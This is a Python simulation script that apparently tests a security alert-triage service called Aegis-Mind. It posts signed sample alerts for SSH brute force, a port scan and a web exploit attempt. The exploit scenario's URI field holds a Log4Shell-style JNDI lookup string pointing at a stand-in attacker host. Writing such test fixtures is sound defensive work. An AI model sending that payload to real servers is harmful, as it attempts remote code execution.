import os
import hmac
import hashlib
import json
import time
import requests
from dotenv import load_dotenv

load_dotenv()

SERVER_URL = os.getenv("SIMULATE_TARGET_URL", "http://127.0.0.1:5000")
WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET", "")

# Sample Scenarios
SCENARIOS = {
    "ssh_brute_force": {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "rule": {
            "level": 10,
            "description": "SSHD brute force trying to get access to root account",
            "id": "5712",
            "mitre": {
                "id": ["T1110"],
                "tactic": ["Credential Access"],
                "technique": ["Brute Force"]
            }
        },
        "agent": {"id": "001", "name": "linux-honeypot-01"},
        "manager": {"name": "wazuh-manager"},
        "source_ip": "185.122.204.197",
        "location": "/var/log/auth.log",
        "data": {"srcuser": "root", "srcport": "44312", "failed_attempts": 42}
    },
    "web_cve_exploit": {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "rule": {
            "level": 12,
            "description": "Potential Log4j / Spring4Shell remote code execution attempt detected in URI parameter",
            "id": "31105",
            "mitre": {
                "id": ["T1190"],
                "tactic": ["Initial Access"],
                "technique": ["Exploit Public-Facing Application"]
            }
        },
        "agent": {"id": "002", "name": "dmz-nginx-reverse-proxy"},
        "manager": {"name": "wazuh-manager"},
        "source_ip": "45.154.255.88",
        "location": "/var/log/nginx/access.log",
        "data": {
            "uri": "/api/v1/auth?token=${jndi:ldap://evil-server.net/payload}",
            "http_method": "GET",
            "user_agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
        }
    },
    "benign_scanner": {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "rule": {
            "level": 4,
            "description": "Port scan detected from public IP address",
            "id": "40101",
            "mitre": {
                "id": ["T1046"],
                "tactic": ["Discovery"],
                "technique": ["Network Service Discovery"]
            }
        },
        "agent": {"id": "003", "name": "perimeter-firewall"},
        "manager": {"name": "splunk-forwarder"},
        "source_ip": "198.20.99.130",  # Example Shodan IP
        "location": "palo_alto_traffic.log",
        "data": {"dstport": "443, 80, 8080", "as_owner": "Shodan"}
    }
}


def compute_signature(payload_bytes: bytes, secret: str) -> str:
    """Computes HMAC-SHA256 signature for the webhook payload."""
    sig = hmac.new(secret.encode("utf-8"), payload_bytes, hashlib.sha256).hexdigest()
    return f"sha256={sig}"


def send_alert(scenario_name: str = "ssh_brute_force"):
    """Sends a simulated alert payload to the Aegis-Mind webhook endpoint."""
    payload = SCENARIOS.get(scenario_name, SCENARIOS["ssh_brute_force"])
    raw_json = json.dumps(payload).encode("utf-8")
    
    headers = {"Content-Type": "application/json"}
    if WEBHOOK_SECRET:
        signature = compute_signature(raw_json, WEBHOOK_SECRET)
        headers["X-Aegis-Signature"] = signature
        print(f"[*] Attached HMAC-SHA256 signature: {signature[:18]}...")

    url = f"{SERVER_URL}/api/alert"
    print(f"\n[*] Sending scenario '{scenario_name}' to {url}...")
    
    try:
        start_time = time.time()
        resp = requests.post(url, data=raw_json, headers=headers, timeout=5)
        duration_ms = (time.time() - start_time) * 1000
        
        print(f"[*] Response Status: HTTP {resp.status_code} ({duration_ms:.1f}ms)")
        print(f"[*] Response Body  : {json.dumps(resp.json(), indent=2)}")
        
        if resp.status_code == 202:
            incident_uuid = resp.json().get("incident_uuid")
            print(f"[+] Alert accepted! Background task UUID: {incident_uuid}")
            print(f"[*] Give the pipeline 3-5 seconds to complete, then inspect /api/incidents")
            return incident_uuid
    except requests.exceptions.ConnectionError:
        print("[!] Connection Error: Is Aegis-Mind running? (python app.py)")
    except Exception as e:
        print(f"[!] Simulation Error: {e}")
    return None


def check_health():
    """Queries the /healthz endpoint."""
    url = f"{SERVER_URL}/healthz"
    try:
        resp = requests.get(url, timeout=3)
        print(f"[*] Health Check [{url}]: HTTP {resp.status_code}")
        print(json.dumps(resp.json(), indent=2))
    except Exception as e:
        print(f"[!] Health check failed: {e}")


def list_recent_incidents():
    """Queries /api/incidents to view persisted alerts."""
    url = f"{SERVER_URL}/api/incidents"
    try:
        resp = requests.get(url, timeout=3)
        print(f"\n[*] Recent Triaged Incidents [{url}]: HTTP {resp.status_code}")
        print(json.dumps(resp.json(), indent=2))
    except Exception as e:
        print(f"[!] Listing incidents failed: {e}")


if __name__ == "__main__":
    import sys
    print("=" * 60)
    print("  🛡️  AEGIS-MIND SOAR SIMULATION SUITE  🛡️")
    print("=" * 60)
    
    check_health()
    
    scenario = sys.argv[1] if len(sys.argv) > 1 else "ssh_brute_force"
    if scenario not in SCENARIOS:
        print(f"[!] Unknown scenario '{scenario}'. Available: {list(SCENARIOS.keys())}")
        scenario = "ssh_brute_force"
        
    incident_id = send_alert(scenario)
    
    if incident_id:
        print("\n[*] Waiting 4 seconds for worker pool triage...")
        time.sleep(4)
        list_recent_incidents()
